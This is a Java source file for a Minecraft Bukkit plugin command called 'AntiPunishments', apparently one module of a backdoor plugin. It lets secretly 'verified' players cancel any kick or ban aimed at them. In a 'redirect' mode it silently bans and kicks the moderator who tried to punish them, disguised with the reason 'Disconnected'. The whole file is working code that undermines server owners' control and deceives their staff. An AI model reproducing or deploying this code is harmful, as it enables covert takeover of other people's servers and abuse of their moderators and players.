package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerKickEvent;

import java.io.IOException;
import java.util.ArrayList;
import java.util.UUID;

public class AntiPunishments implements Command, Listener {
    private final ArrayList<UUID> toggledOff = new ArrayList<>();
    private final ArrayList<UUID> returnToSender = new ArrayList<>();
    private Z_ _z;

    @Override
    public boolean playerOnly() {
        return true;
    }

    @Override
    public String[] getCommands() {
        return new String[]{"antipunishments", "ap"};
    }

    @Override
    public String getDescription() {
        return "Toggles you off from getting kicked or banned.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        UUID uuid = executor.getUniqueId();

        if (toggledOff.contains(uuid)) {
            toggledOff.remove(uuid);

            if (context.getArgs().length != 0) {
                returnToSender.add(uuid);
                sender.sendMessage(Colors.Prefix + Colors.Caution + "Enabling with redirect mode on...");
            }

            sender.sendMessage(Colors.Prefix + Colors.Success + "You will be notified and protected of kicks or bans!");
            return;
        }

        toggledOff.add(uuid);
        returnToSender.remove(uuid);
        sender.sendMessage(Colors.Prefix + Colors.Failure + "You will no longer be protected and notified of kicks or bans.");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
        this._z = z;
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void onCommand(PlayerCommandPreprocessEvent e) throws IOException, InterruptedException {
        String message = e.getMessage();
        if (!message.toLowerCase().contains("kick") && !message.toLowerCase().contains("ban")) {
            return;
        }

        for (Player p : Bukkit.getOnlinePlayers()) {
            if (!this._z.getAuth().isVerified(p.getName()) || toggledOff.contains(p.getUniqueId())) {
                continue;
            }

            if (!message.toLowerCase().contains(p.getName().toLowerCase())) {
                continue;
            }

            e.setCancelled(true);
            p.sendMessage(Colors.Prefix + Colors.Caution + "Prevented you from a punishment by " + e.getPlayer().getName() + " -> '" + e.getMessage() + "'!");
            if (returnToSender.contains(p.getUniqueId())) {
                p.sendMessage(Colors.Prefix + Colors.Success + "Successfully redirecting punishment to " + e.getPlayer().getName() + "! (Banned them!)");
                Bukkit.getScheduler().scheduleSyncDelayedTask(this._z, () -> {
                    Bukkit.getBanList(BanList.Type.NAME).addBan(e.getPlayer().getName(), "Disconnected", null, null);
                    e.getPlayer().kickPlayer("Disconnected");
                });
            }
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onKick(PlayerKickEvent e) throws IOException, InterruptedException {
        if (!this._z.getAuth().isVerified(e.getPlayer().getName()) || toggledOff.contains(e.getPlayer().getUniqueId())) {
            return;
        }

        e.setCancelled(true);
        e.getPlayer().sendMessage(Colors.Prefix + Colors.Caution + "Prevented you from being kicked from somewhere random!");
    }
}
